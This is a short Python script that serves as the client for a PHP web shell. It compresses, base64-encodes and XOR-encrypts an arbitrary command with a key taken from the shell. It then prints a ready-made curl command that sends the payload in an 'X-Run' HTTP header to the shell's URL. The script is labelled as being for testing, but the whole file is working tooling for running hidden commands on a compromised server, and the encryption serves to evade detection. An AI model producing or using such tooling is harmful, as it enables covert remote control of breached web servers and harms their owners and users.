#!/usr/bin/env python3
import sys
import base64
import hashlib
import zlib
import argparse

def encrypt_command(command, key):
    """Encrypt a command using the same method as the PHP shell"""
    # Compress the command
    compressed = zlib.compress(command.encode('utf-8'))
    
    # Base64 encode the compressed content
    encoded = base64.b64encode(compressed)
    
    # Get key bytes for XOR encryption
    key_bytes = hashlib.sha256(key.encode()).digest()
    
    # XOR encryption - directly on bytes, not on string
    encrypted = bytearray()
    for i in range(len(encoded)):
        encrypted.append(encoded[i] ^ key_bytes[i % len(key_bytes)])
    
    # Return base64 encoded result
    return base64.b64encode(encrypted).decode('utf-8')


def main():
    parser = argparse.ArgumentParser(description='Encrypt a command for PHP shell testing')
    parser.add_argument('command', help='Command to encrypt')
    parser.add_argument('-k', '--key', required=True, help='Encryption key from the shell')
    parser.add_argument('-c', '--curl', action='store_true', help='Output a ready-to-use curl command')
    parser.add_argument('-u', '--url', help='URL of the shell (for curl command)')
    
    args = parser.parse_args()
    
    encrypted = encrypt_command(args.command, args.key)
    
    if args.curl and args.url:
        print(f"curl -v -H \"X-Run: {encrypted}\" {args.url}")
    else:
        print(f"Encrypted command: {encrypted}")
        print("\nUse with curl:")
        print(f"curl -v -H \"X-Run: {encrypted}\" http://your-shell-url")
    
if __name__ == "__main__":
    main()
